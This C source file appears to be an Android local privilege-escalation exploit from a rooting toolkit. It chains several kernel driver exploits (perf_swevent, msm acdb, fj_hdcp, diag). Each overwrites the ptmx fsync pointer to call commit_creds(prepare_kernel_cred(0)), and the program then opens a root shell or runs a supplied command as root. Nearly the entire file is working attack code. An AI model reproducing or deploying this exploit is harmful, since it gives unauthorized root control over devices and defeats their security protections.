#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <sys/system_properties.h>
#include "cred.h"
#include "mm.h"
#include "ptmx.h"
#include "libdiagexploit/diag.h"
#include "libperf_event_exploit/perf_event.h"
#include "libmsm_acdb_exploit/acdb.h"
#include "libfj_hdcp_exploit/fj_hdcp.h"

void
obtain_root_privilege(void)
{
  commit_creds(prepare_kernel_cred(0));
}

static bool
run_obtain_root_privilege(void *user_data)
{
  int fd;

  fd = open(PTMX_DEVICE, O_WRONLY);
  fsync(fd);
  close(fd);

  return true;
}

static bool
attempt_diag_exploit(unsigned long int address)
{
  struct diag_values injection_data;

  injection_data.address = address;
  injection_data.value = (uint16_t)&obtain_root_privilege;

  return diag_run_exploit(&injection_data, 1,
                          run_obtain_root_privilege, NULL);
}

static bool
attempt_acdb_exploit(unsigned long int address, unsigned long int original_value)
{
  if (acdb_run_exploit(address, (int)&obtain_root_privilege,
                       run_obtain_root_privilege, NULL)) {

    acdb_write_value_at_address(address, original_value);

    return true;
  }

  return false;
}

static bool
attempt_fj_hdcp_exploit(unsigned long int address, unsigned long int original_value)
{
  if (fj_hdcp_run_exploit(address, (int)&obtain_root_privilege,
                          run_obtain_root_privilege, NULL)) {

    fj_hdcp_write_value_at_address(address, original_value);

    return true;
  }

  return false;
}

static bool
run_exploit(void)
{
  unsigned long int ptmx_fsync_address;
  unsigned long int ptmx_fops_address;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  ptmx_fsync_address = ptmx_fops_address + 0x38;


  printf("Attempt perf_swevent exploit...\n");
  if (perf_swevent_run_exploit(ptmx_fsync_address, (int)&obtain_root_privilege,
                                  run_obtain_root_privilege, NULL)) {
    return true;
  }
  printf("\n");

  printf("Attempt acdb exploit...\n");
  if (attempt_acdb_exploit(ptmx_fsync_address, 0)) {
    return true;
  }
  printf("\n");

  printf("Attempt fj_hdcp exploit...\n");
  if (attempt_fj_hdcp_exploit(ptmx_fsync_address, 0)) {
    return true;
  }
  printf("\n");

  return attempt_diag_exploit(ptmx_fsync_address);
}

void
device_detected(void)
{
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  printf("\n\nDevice detected: %s (%s)\n\n", device, build_id);
}

int
main(int argc, char **argv)
{
  char* command = NULL;
  int i;
  for (i = 1; i < argc; i++) {
    if (!strcmp(argv[i], "-c")) {
      if (++i < argc) {
        command = argv[i];
      }
    }
  }

  device_detected();

  set_kernel_phys_offset(0x200000);
  remap_pfn_range = get_remap_pfn_range_address();
  if (!remap_pfn_range) {
    printf("You need to manage to get remap_pfn_range addresses.\n");
    exit(EXIT_FAILURE);
  }

  if (!setup_creds_functions()) {
    printf("Failed to get prepare_kernel_cred and commit_creds addresses.\n");
    exit(EXIT_FAILURE);
  }

  run_exploit();

  if (getuid() != 0) {
    printf("Failed to obtain root privilege.\n");
    exit(EXIT_FAILURE);
  }

  if (command == NULL) {
    system("/system/bin/sh");
  } else {
    execl("/system/bin/sh", "/system/bin/sh", "-c", command, NULL);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
